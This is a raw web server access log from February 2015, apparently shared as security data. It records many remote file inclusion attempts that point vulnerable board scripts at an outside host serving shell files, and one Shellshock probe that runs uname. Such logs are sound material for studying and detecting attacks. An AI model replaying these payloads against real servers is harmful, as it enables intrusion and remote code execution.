112.218.68.155 - - [21/Feb/2015:12:00:24 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
112.218.68.155 - - [21/Feb/2015:12:00:24 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
112.218.68.155 - - [21/Feb/2015:12:00:26 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
203.58.0.155 - - [21/Feb/2015:12:00:32 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
203.58.0.155 - - [21/Feb/2015:12:00:34 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
203.58.0.155 - - [21/Feb/2015:12:00:34 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
203.58.0.155 - - [21/Feb/2015:12:00:36 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
203.58.0.155 - - [21/Feb/2015:12:00:40 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
203.58.0.155 - - [21/Feb/2015:12:00:41 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
203.58.0.155 - - [21/Feb/2015:12:00:42 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
203.58.0.155 - - [21/Feb/2015:12:00:44 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
78.96.44.99 - - [21/Feb/2015:12:02:59 -0800] "GET /?x=() { :; }; echo Content-type:text/plain;echo;echo;echo M`expr 1330 + 7`H;/bin/uname -a;echo @ HTTP/1.0" 418 695 "() { :; }; echo Content-type:text/plain;echo;echo;echo M`expr 1330 + 7`H;/bin/uname -a;echo @" "() { :; }; echo Content-type:text/plain;echo;echo;echo M`expr 1330 + 7`H;/bin/uname -a;echo @" 
207.46.13.0 - - [21/Feb/2015:12:23:01 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.0 - - [21/Feb/2015:12:48:25 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
14.202.227.236 - - [21/Feb/2015:13:20:47 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
14.202.227.236 - - [21/Feb/2015:13:20:48 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
14.202.227.236 - - [21/Feb/2015:13:20:48 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
14.202.227.236 - - [21/Feb/2015:13:20:50 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
14.202.227.236 - - [21/Feb/2015:13:20:53 -0800] "GET / HTTP/1.1" 304 189 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
80.68.145.110 - - [21/Feb/2015:13:31:37 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:13:31:38 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:13:31:38 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:13:31:40 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:13:31:57 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:13:31:58 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:13:31:58 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
80.68.145.110 - - [21/Feb/2015:13:32:00 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
176.31.252.38 - - [21/Feb/2015:13:40:26 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:13:40:27 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:13:40:27 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:13:40:29 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
198.50.146.246 - - [21/Feb/2015:13:40:48 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:13:40:49 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:13:40:49 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:13:40:50 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
211.47.181.38 - - [21/Feb/2015:13:40:55 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
112.218.68.155 - - [21/Feb/2015:13:40:55 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
211.47.181.38 - - [21/Feb/2015:13:40:56 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
112.218.68.155 - - [21/Feb/2015:13:40:57 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
211.47.181.38 - - [21/Feb/2015:13:40:57 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
112.218.68.155 - - [21/Feb/2015:13:40:57 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
211.47.181.38 - - [21/Feb/2015:13:40:58 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
112.218.68.155 - - [21/Feb/2015:13:40:58 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:13:41:09 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:13:41:10 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:13:41:11 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:13:41:12 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
198.50.146.246 - - [21/Feb/2015:13:43:22 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:13:43:23 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:13:43:23 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:13:43:24 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:13:46:08 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:13:46:08 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:13:46:09 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:13:46:09 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:13:46:10 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:13:46:10 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:13:46:10 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:13:46:11 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
112.218.68.155 - - [21/Feb/2015:13:47:17 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:13:47:19 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:13:47:19 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:13:47:20 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
103.246.36.213 - - [21/Feb/2015:14:34:18 -0800] "GET / HTTP/1.1" 200 21971 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" 
203.6.69.2 - - [21/Feb/2015:14:34:19 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0" 
203.6.69.2 - - [21/Feb/2015:14:34:20 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0" 
203.6.69.2 - - [21/Feb/2015:14:34:20 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0" 
103.246.36.213 - - [21/Feb/2015:14:35:30 -0800] "GET /data HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" 
203.6.69.2 - - [21/Feb/2015:14:35:30 -0800] "GET /data HTTP/1.1" 404 340 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0" 
203.6.69.2 - - [21/Feb/2015:14:35:31 -0800] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0" 
66.249.84.128 - - [21/Feb/2015:14:42:43 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon" 
66.249.84.252 - - [21/Feb/2015:14:42:43 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon" 
46.119.124.167 - - [21/Feb/2015:16:18:42 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 418 676 "http://nacap.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
46.119.124.167 - - [21/Feb/2015:16:18:43 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 418 676 "http://nacap.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
46.119.124.167 - - [21/Feb/2015:16:18:43 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 418 676 "http://nacap.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
178.33.226.103 - - [21/Feb/2015:16:29:12 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:16:29:12 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:16:29:13 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:16:29:13 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:16:29:13 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:16:29:13 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:16:29:14 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:16:29:15 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
112.218.68.155 - - [21/Feb/2015:16:29:51 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:16:29:53 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:16:29:53 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:16:29:55 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:16:29:58 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:29:59 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:16:30:00 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:30:01 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:30:01 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:16:30:01 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:30:01 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:16:30:02 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:30:02 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:30:03 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:16:30:03 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:30:05 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:30:10 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
178.33.226.103 - - [21/Feb/2015:16:30:10 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:16:30:11 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:16:30:11 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
112.218.68.155 - - [21/Feb/2015:16:30:11 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:30:12 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
178.33.226.103 - - [21/Feb/2015:16:30:13 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
112.218.68.155 - - [21/Feb/2015:16:30:13 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:30:13 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:30:14 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:30:14 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:30:14 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
